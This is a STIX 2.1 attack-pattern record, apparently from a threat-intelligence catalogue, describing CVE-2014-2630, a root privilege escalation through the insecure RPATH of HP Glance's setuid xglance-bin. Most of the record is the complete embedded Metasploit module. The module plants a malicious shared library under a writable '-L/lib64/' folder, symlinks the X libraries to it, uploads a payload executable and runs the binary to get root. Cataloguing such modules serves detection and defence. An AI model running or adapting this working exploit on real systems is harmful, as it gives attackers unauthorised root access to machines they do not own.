{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--addc2ca3-b5a9-4495-be73-765b6575b5ab",
    "created": "2024-08-14T16:59:09.796672Z",
    "modified": "2024-08-14T16:59:09.796676Z",
    "name": "HP Performance Monitoring xglance Priv Esc",
    "description": " This exploit takes advantage of xglance-bin, part of HP's Glance (or Performance Monitoring) version 11 'and subsequent' , which was compiled with an insecure RPATH option.  The RPATH includes a relative path to -L/lib64/ which can be controlled by a user. Creating libraries in this location will result in an escalation of privileges to root.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/local/hp_xglance_priv_esc.rb",
            "external_id": "hp_xglance_priv_esc.rb"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/redtimmy/perf-exploiter"
        },
        {
            "source_name": "reference",
            "url": "https://www.portcullis-security.com/security-research-and-downloads/security-advisories/cve-2014-2630/"
        },
        {
            "source_name": "CVE",
            "external_id": "2014-2630"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = GreatRanking\n\n  include Msf::Post::Linux::Priv\n  include Msf::Post::Linux::System\n  include Msf::Post::Linux::Compile\n  include Msf::Post::File\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'HP Performance Monitoring xglance Priv Esc',\n        'Description' => %q{\n          This exploit takes advantage of xglance-bin, part of\n          HP's Glance (or Performance Monitoring) version 11 'and subsequent'\n          , which was compiled with an insecure RPATH option.  The RPATH includes\n          a relative path to -L/lib64/ which can be controlled by a user.\n          Creating libraries in this location will result in an\n          escalation of privileges to root.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'h00die', # msf module\n          'Tim Brown', # original finding\n          'Robert Jaroszuk', # exploit\n          'Marco Ortisi', # exploit\n        ],\n        'Platform' => [ 'linux' ],\n        'Arch' => [ ARCH_X86, ARCH_X64 ],\n        'SessionTypes' => [ 'shell', 'meterpreter' ],\n        'Targets' => [\n          [ 'Automatic', {} ],\n          [ 'Linux x86', { 'Arch' => ARCH_X86 } ],\n          [ 'Linux x64', { 'Arch' => ARCH_X64 } ]\n        ],\n        'Privileged' => true,\n        'References' => [\n          [ 'EDB', '48000' ],\n          [ 'URL', 'https://seclists.org/fulldisclosure/2014/Nov/55' ], # permissions, original finding\n          [ 'URL', 'https://www.redtimmy.com/linux-hacking/perf-exploiter/' ], # exploit\n          [ 'URL', 'https://github.com/redtimmy/perf-exploiter' ],\n          [ 'PACKETSTORM', '156206' ],\n          [ 'URL', 'https://www.portcullis-security.com/security-research-and-downloads/security-advisories/cve-2014-2630/' ],\n          [ 'CVE', '2014-2630' ]\n        ],\n        'DisclosureDate' => '2014-11-19',\n        'DefaultTarget' => 0,\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [ARTIFACTS_ON_DISK]\n        }\n      )\n    )\n    register_options [\n      OptString.new('GLANCE_PATH', [ true, 'Path to xglance-bin', '/opt/perf/bin/xglance-bin' ])\n    ]\n    register_advanced_options [\n      OptString.new('WritableDir', [ true, 'A directory where we can write files', '/tmp' ])\n    ]\n  end\n\n  # Simplify pulling the writable directory variable\n  def base_dir\n    datastore['WritableDir'].to_s\n  end\n\n  def exploit_folder\n    \"#{base_dir}/-L/lib64/\"\n  end\n\n  def glance_path\n    datastore['GLANCE_PATH'].to_s\n  end\n\n  # Pull the exploit binary or file (.c typically) from our system\n  def exploit_data(file)\n    ::File.binread ::File.join(Msf::Config.data_directory, 'exploits', 'CVE-2014-2630', file)\n  end\n\n  def find_libs\n    libs = cmd_exec \"ldd #{glance_path} | grep libX\"\n    %r{(?<lib>libX.+\\.so\\.\\d) => -L/lib64} =~ libs\n    return nil if lib.nil?\n\n    lib\n  end\n\n  def check\n    return CheckCode::Safe(\"#{glance_path} file not found\") unless file? glance_path\n    return CheckCode::Safe(\"#{glance_path} is not setuid\") unless setuid? glance_path\n\n    lib = find_libs\n    if lib.nil?\n      vprint_error 'Patched xglance-bin, not linked to -L/lib64/'\n      return CheckCode::Safe\n    end\n    vprint_good \"xglance-bin found, and linked to vulnerable relative path -L/lib64/ through #{lib}\"\n    CheckCode::Appears\n  end\n\n  def exploit\n    if !datastore['ForceExploit'] && is_root?\n      fail_with(Failure::BadConfig, 'Session already has root privileges. Set ForceExploit to override.')\n    end\n\n    unless writable? base_dir\n      fail_with Failure::BadConfig, \"#{base_dir} is not writable\"\n    end\n\n    # delete exploit folder in case a previous attempt failed\n    vprint_status(\"Deleting exploit folder: #{base_dir}/-L\")\n    rm_cmd = \"rm -rf \\\"#{base_dir}/-L\\\"\"\n    cmd_exec(rm_cmd)\n    # make folder\n    vprint_status(\"Creating exploit folder: #{exploit_folder}\")\n    cmd_exec \"mkdir -p #{exploit_folder}\"\n    register_dir_for_cleanup \"#{base_dir}/-L\"\n\n    # drop our .so on the system that calls our payload\n    # we need gcc to compile instead of metasm since metasm\n    # removes unused variables, which we need to keep xglance-bin\n    # from breaking and not launching our exploit\n    so_file = \"#{exploit_folder}libXm.so.3\"\n    if live_compile?\n      vprint_status 'Live compiling exploit on system...'\n      payload_path = \"#{base_dir}/.#{rand_text_alphanumeric(5..10)}\"\n      code = exploit_data('CVE-2014-2630.c')\n      code.sub!(payload_path.to_s, payload_path) # inject our payload path\n      upload_and_compile so_file, code, '-fPIC -shared -static-libgcc'\n      rm_f \"#{so_file}.c\"\n    else\n      payload_path = '/tmp/.u4aLoiq'\n      vprint_status 'Dropping pre-compiled exploit on system...'\n      upload_and_chmodx so_file, exploit_data('libXm.so.3')\n    end\n\n    # Upload payload executable\n    vprint_status 'uploading payload'\n    upload_and_chmodx payload_path, generate_payload_exe\n\n    # link so files to exploit vuln\n    lib = find_libs\n    # just to be safe, Xt and Xp were in the original exploit\n    # our mock binary is also exploitsable through libXmu.so.6\n    # unsure about the real binary\n    cd exploit_folder\n    ['libXp.so.6', 'libXt.so.6', 'libXmu.so.6', lib].each do |l|\n      cmd_exec \"ln -s libXm.so.3 #{l}\"\n    end\n\n    # Launch exploit\n    print_status 'Launching xglance-bin...'\n    cd base_dir\n    output = cmd_exec glance_path\n    output.each_line { |line| vprint_status line.chomp }\n    print_warning(\"Manual cleanup of #{exploit_folder} may be required\")\n  end\nend\n",
    "x_mitre_disclosure_date": "2014-11-19",
    "x_mitre_platforms": [
        "[ 'linux' ]"
    ]
}